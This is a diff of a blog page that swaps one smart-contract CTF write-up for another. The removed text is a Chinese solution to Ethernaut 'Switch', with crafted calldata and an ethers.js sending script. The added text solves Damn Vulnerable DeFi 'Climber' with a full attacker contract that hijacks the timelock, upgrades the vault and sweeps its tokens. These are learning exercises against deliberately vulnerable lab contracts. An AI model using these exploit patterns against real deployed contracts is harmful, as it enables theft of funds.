@@ -11,7 +11,7 @@
   
   <title>
     
-      29.Switch 
+      12.Climber 
       
       
       |
@@ -147,19 +147,19 @@
   <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
   <div class="container post-details" id="post-details">
     <div class="post-content">
-      <div class="post-title">29.Switch</div>
+      <div class="post-title">12.Climber</div>
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-          2023-07-20 00:25:05
+          2023-07-20 16:20:56
         </span>
         
               <span class="post-categories">
                 <i class="iconfont icon-bookmark" title="Categories"></i>
                 
                 <span class="span--category">
-                  <a href="/categories/04-Ethernaut-CTF/" title="04.Ethernaut CTF">
-                    <b>#</b> 04.Ethernaut CTF
+                  <a href="/categories/05-Damn-Vulnerable-DeFi-v2-CTF/" title="05.Damn Vulnerable DeFi v2 CTF">
+                    <b>#</b> 05.Damn Vulnerable DeFi v2 CTF
                   </a>
                 </span>
                 
@@ -167,33 +167,31 @@
           
       </div>
       <div class="markdown-body">
-        <h1 id="Switch"><a href="#Switch" class="headerlink" title="Switch"></a>Switch</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>要求：将switchOn设置为true</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Switch &#123;</span><br><span class="line">    bool public switchOn; // switch is off</span><br><span class="line">    bytes4 public offSelector = bytes4(keccak256(&quot;turnSwitchOff()&quot;)); // 0x20606e15</span><br><span class="line"></span><br><span class="line">    modifier onlyThis() &#123;</span><br><span class="line">        require(msg.sender == address(this), &quot;Only the contract can call this&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOff() &#123;</span><br><span class="line">        // we use a complex data type to put in memory</span><br><span class="line">        bytes32[1] memory selector;</span><br><span class="line">        // check that the calldata at position 68 (location of _data)</span><br><span class="line">        assembly &#123;</span><br><span class="line">            calldatacopy(selector, 68, 4) // grab function selector from calldata</span><br><span class="line">        &#125;</span><br><span class="line">        require(</span><br><span class="line">            selector[0] == offSelector,</span><br><span class="line">            &quot;Can only call the turnOffSwitch function&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flipSwitch(bytes memory _data) public onlyOff &#123;</span><br><span class="line">        (bool success, ) = address(this).call(_data);</span><br><span class="line">        require(success, &quot;call failed :(&quot;);</span><br><span class="line">    &#125; // 30c13ade</span><br><span class="line"></span><br><span class="line">    function turnSwitchOn() public onlyThis &#123;</span><br><span class="line">        switchOn = true;</span><br><span class="line">    &#125; // 0x76227e12</span><br><span class="line"></span><br><span class="line">    function turnSwitchOff() public onlyThis &#123;</span><br><span class="line">        switchOn = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>考察calldata编码</p>
+        <h1 id="Climber"><a href="#Climber" class="headerlink" title="Climber"></a>Climber</h1><h2 id="analyse"><a href="#analyse" class="headerlink" title="analyse"></a>analyse</h2><h3 id="1-overview"><a href="#1-overview" class="headerlink" title="1.overview"></a>1.overview</h3><p>There are a lot of contract:</p>
 <ul>
-<li><p>因为onlyThis的限制，所以需要调用<code>flipSwitch()</code>，然后本合约再去调用<code>turnSwitchOn()</code>完成题目。</p>
-</li>
-<li><p><code>onlyOff()</code></p>
-<ul>
-<li><p><code>calldatacopy(t, f, s)</code>：从位置f的calldata复制s字节到位置t的内存中，把输入数据加载到Memory中。那么这里就是将calldata的第68字节之后4个字节的数据复制到selector中，然后和offSelector作比较</p>
-</li>
-<li><p>不用担心4字节和32字节怎么比较，因为无论他是补0还是截断比较，只要前四字节相同，都是可以通过的（好吧是我不想研究它是补0比较还是截断比较的了:hankey:）</p>
-</li>
-<li><p>不要直接直接调用合约实例的flipSwitch()方法然后传参，这样是错的！因为你传入_data数据的时候，会自动帮你做ABI包装，这样就无法通过检查了，我们要自己构造calldata！然后用ethersjs发送原始数据进行交互</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">	    30c13ade // 这是flipSwitch()函数选择器</span><br><span class="line">0x00	0000000000000000000000000000000000000000000000000000000000000060 // 0x60之后的32字节是实际数据</span><br><span class="line">0x20	0000000000000000000000000000000000000000000000000000000000000000 // 补0</span><br><span class="line">0x40	20606e1500000000000000000000000000000000000000000000000000000000 // 通过onlyOff()的检验</span><br><span class="line">0x60	0000000000000000000000000000000000000000000000000000000000000004 // turnSwitchOn()的函数选择器长度</span><br><span class="line">0x80	76227e1200000000000000000000000000000000000000000000000000000000 // 根据长度截取内容，然后执行call()</span><br></pre></td></tr></table></figure>
-</li>
+<li>ClimberTimelock: controls the ClimberVault</li>
+<li>ClimberVault: holds the asset and uses UUPS pattern</li>
+<li>UUPS, etc. : UUPS pattern</li>
 </ul>
-</li>
-</ul>
-<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">const &#123;ethers&#125; = require(&quot;ethers&quot;)</span><br><span class="line"></span><br><span class="line">// 配置goerli网络提供者</span><br><span class="line">const provider = ethers.getDefaultProvider(&quot;https://eth-goerli.g.alchemy.com/v2/xxxxxxxxxxxxxx&quot;);</span><br><span class="line"></span><br><span class="line">// 以太坊钱包私钥</span><br><span class="line">const privateKey = &#x27;xxxxxxxxxxxxx&#x27;;</span><br><span class="line"></span><br><span class="line">// 根据私钥创建钱包</span><br><span class="line">const wallet = new ethers.Wallet(privateKey, provider);</span><br><span class="line"></span><br><span class="line">// 题目地址</span><br><span class="line">const toAddress = &#x27;0x5D342aa5Fb9aa061a90e1D40dE65a8719BbBf014&#x27;;</span><br><span class="line"></span><br><span class="line">// 要发送的原始数据</span><br><span class="line">const data = &#x27;0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000&#x27;;</span><br><span class="line"></span><br><span class="line">// 创建交易对象</span><br><span class="line">const transaction = &#123;</span><br><span class="line">  to: toAddress,</span><br><span class="line">  data: data,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 发送交易</span><br><span class="line">async function sendTransactionExample() &#123;</span><br><span class="line">  try &#123;</span><br><span class="line">    // 发送交易</span><br><span class="line">    const response = await wallet.sendTransaction(transaction);</span><br><span class="line"></span><br><span class="line">    console.log(&#x27;交易成功:&#x27;, response.hash);</span><br><span class="line">  &#125; catch (error) &#123;</span><br><span class="line">    console.error(&#x27;交易失败:&#x27;, error);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sendTransactionExample();</span><br></pre></td></tr></table></figure>
-<p><img src="https://moe.photo/images/2023/07/20/image-20230720004159583.png" alt></p>
+<p>In this level, our goal is to get the entire money in the ClimberVault</p>
+<h3 id="2-analyses"><a href="#2-analyses" class="headerlink" title="2.analyses"></a>2.analyses</h3><p>We can get the entire money by <code>sweepFunds()</code> while it can be called only by ClimberTimelock and transfers to ClimberTimelock . But we can upgrade the contract because of UUPS pattern.</p>
+<p>ClimberTimelock contract is important since it holds a lot of authority. In this level, there is some problem with execute() which we can exploit. In normal situation, the execution is that: call <code>schedule()</code> first, and then call <code>execute()</code>. <code>schedule()</code> can only be called by PROPOSER_ROLE but everyone can call <code>execute()</code>.</p>
+<p>So we, a normal member, not PROPOSER_ROLE, can exploit <code>execute()</code>. In this function, it executes <code>functionCallWithValue()</code> first which contains call() in <code>address.sol</code> library and then check if <code>operations[id].executed = true;</code> that only can be set in <code>schedule()</code>. It means everyone can call <code>execute</code> with the proposals containing making our proposals true.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function execute(</span><br><span class="line">    address[] calldata targets,</span><br><span class="line">    uint256[] calldata values,</span><br><span class="line">    bytes[] calldata dataElements,</span><br><span class="line">    bytes32 salt</span><br><span class="line">) external payable &#123;</span><br><span class="line">    require(targets.length &gt; 0, &quot;Must provide at least one target&quot;);</span><br><span class="line">    require(targets.length == values.length);</span><br><span class="line">    require(targets.length == dataElements.length);</span><br><span class="line"></span><br><span class="line">    bytes32 id = getOperationId(targets, values, dataElements, salt);</span><br><span class="line"></span><br><span class="line">    for (uint8 i = 0; i &lt; targets.length; i++) &#123;</span><br><span class="line">        targets[i].functionCallWithValue(dataElements[i], values[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    require(getOperationState(id) == OperationState.ReadyForExecution);</span><br><span class="line">    operations[id].executed = true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>So our idea is that:</p>
+<ol>
+<li>make delay to zero so that we can attack right now.</li>
+<li>grant PROPOSER_ROLE to attack contract</li>
+<li>upgrade climbervalut which contains a new <code>sweepFunds()</code>. and this new <code>sweepFunds()</code> can be call by the attack contract and send money to the attack contract.</li>
+</ol>
+<h2 id="solutions"><a href="#solutions" class="headerlink" title="solutions"></a>solutions</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">import &quot;@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol&quot;;</span><br><span class="line">import &quot;../climber/ClimberTimelock.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;../climber/ClimberVault.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract ClimberAttacker is UUPSUpgradeable&#123;</span><br><span class="line">    ClimberTimelock  immutable timelock;</span><br><span class="line">    address immutable vaultProxyAddress;</span><br><span class="line">    IERC20 immutable token;</span><br><span class="line">    address immutable attacker;</span><br><span class="line"></span><br><span class="line">    constructor(ClimberTimelock _timelock, address _vaultProxyAddress,IERC20 _token)&#123;</span><br><span class="line">        timelock = _timelock;</span><br><span class="line">        vaultProxyAddress = _vaultProxyAddress;</span><br><span class="line">        token = _token;</span><br><span class="line">        attacker = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buildProposal() internal returns(address[]memory,uint256[]memory,bytes[]memory)&#123;</span><br><span class="line">        address[] memory targets = new address[](5);</span><br><span class="line">        uint256[] memory values = new uint256[](5);</span><br><span class="line">        bytes[] memory dataElements = new bytes[](5);</span><br><span class="line"></span><br><span class="line">        //upgrade delay to zero</span><br><span class="line">        targets[0] = address(timelock);</span><br><span class="line">        values[0] = 0;</span><br><span class="line">        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector,0);</span><br><span class="line"></span><br><span class="line">        // grant our attack contract PROPOSER_ROLE</span><br><span class="line">        targets[1] = address(timelock);</span><br><span class="line">        values[1] = 0;</span><br><span class="line">        dataElements[1] = abi.encodeWithSelector(AccessControl.grantRole.selector,timelock.PROPOSER_ROLE(),address(this));</span><br><span class="line"></span><br><span class="line">        // execute our malicious proposal</span><br><span class="line">        targets[2] = address(this);</span><br><span class="line">        values[2] = 0;</span><br><span class="line">        dataElements[2] = abi.encodeWithSelector(ClimberAttacker.scheduleProposal.selector);</span><br><span class="line"></span><br><span class="line">        // upgrade our implementation contract: climbervault</span><br><span class="line">        targets[3] = address(vaultProxyAddress);</span><br><span class="line">        values[3] = 0;</span><br><span class="line">        dataElements[3] = abi.encodeWithSelector(UUPSUpgradeable.upgradeTo.selector,address(this));</span><br><span class="line">        </span><br><span class="line">        // get the money</span><br><span class="line">        targets[4] = address(vaultProxyAddress);</span><br><span class="line">        values[4] = 0;</span><br><span class="line">        dataElements[4] = abi.encodeWithSelector(ClimberAttacker.sweepFunds.selector);</span><br><span class="line">        </span><br><span class="line">        return (targets,values,dataElements);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	// schedule our malicious proposal</span><br><span class="line">    function scheduleProposal()external &#123;</span><br><span class="line">        (address[] memory targets,uint256[] memory values,bytes[] memory dataElements) = buildProposal();</span><br><span class="line">        timelock.schedule(targets, values, dataElements, 0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	// execute our malicious proposal</span><br><span class="line">    function executeProposal() external &#123;</span><br><span class="line">        (address[] memory targets,uint256[] memory values,bytes[] memory dataElements) = buildProposal();</span><br><span class="line">        timelock.execute(targets, values, dataElements, 0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	// exploit the money</span><br><span class="line">    function sweepFunds()external &#123;</span><br><span class="line">        token.transfer(attacker,token.balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	// must override this function, because it is an interface</span><br><span class="line">    function _authorizeUpgrade(address newImplementation) internal  override &#123;&#125;</span><br><span class="line">       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
       </div>
       
         <div class="prev-or-next">
           <div class="post-foot-next">
             
-              <a href="/2023/07/19/04.Ethernaut%20CTF/28.Gatekeeper%20Three/" target="_self">
+              <a href="/2023/07/20/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/11.backdoor/" target="_self">
                 <i class="iconfont icon-chevronleft"></i>
                 <span>Prev</span>
               </a>
@@ -202,15 +200,15 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-              2023-07-20 00:25:05
+              2023-07-20 16:20:56
             </span>
             
                   <span class="post-categories">
                     <i class="iconfont icon-bookmark" title="Categories"></i>
                     
                     <span class="span--category">
-                      <a href="/categories/04-Ethernaut-CTF/" title="04.Ethernaut CTF">
-                        <b>#</b> 04.Ethernaut CTF
+                      <a href="/categories/05-Damn-Vulnerable-DeFi-v2-CTF/" title="05.Damn Vulnerable DeFi v2 CTF">
+                        <b>#</b> 05.Damn Vulnerable DeFi v2 CTF
                       </a>
                     </span>
                     
@@ -218,11 +216,6 @@
               
           </div>
           <div class="post-foot-prev">
-            
-              <a href="/2023/07/20/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/11.backdoor/" target="_self">
-                <span>Next</span>
-                <i class="iconfont icon-chevronright"></i>
-              </a>
             
           </div>
         </div>
@@ -236,7 +229,7 @@
     <div class="title">Contents</div>
     <div class="catalog-content">
       
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Switch"><span class="toc-text">Switch</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-text">解题</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Climber"><span class="toc-text">Climber</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#analyse"><span class="toc-text">analyse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-overview"><span class="toc-text">1.overview</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-analyses"><span class="toc-text">2.analyses</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#solutions"><span class="toc-text">solutions</span></a></li></ol></li></ol>
       
     </div>
   </div>
@@ -523,12 +516,12 @@
       </a>
       <div class="share-content hidden">
         
-          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + 29.Switch + '&url=' + http%3A%2F%2Fexample.com%2F2023%2F07%2F20%2F04.Ethernaut%2520CTF%2F29.Switch%2F + '" target="_blank" title="Twitter">
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + 12.Climber + '&url=' + http%3A%2F%2Fexample.com%2F2023%2F07%2F20%2F05.Damn%2520Vulnerable%2520DeFi%2520v2%2520CTF%2F12.Climber%2F + '" target="_blank" title="Twitter">
             <i class="iconfont icon-twitter"></i>
           </a>
         
         
-          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2023/07/20/04.Ethernaut%20CTF/29.Switch/" target="_blank" title="Facebook">
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2023/07/20/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/12.Climber/" target="_blank" title="Facebook">
             <i class="iconfont icon-facebooksquare"></i>
           </a>
         
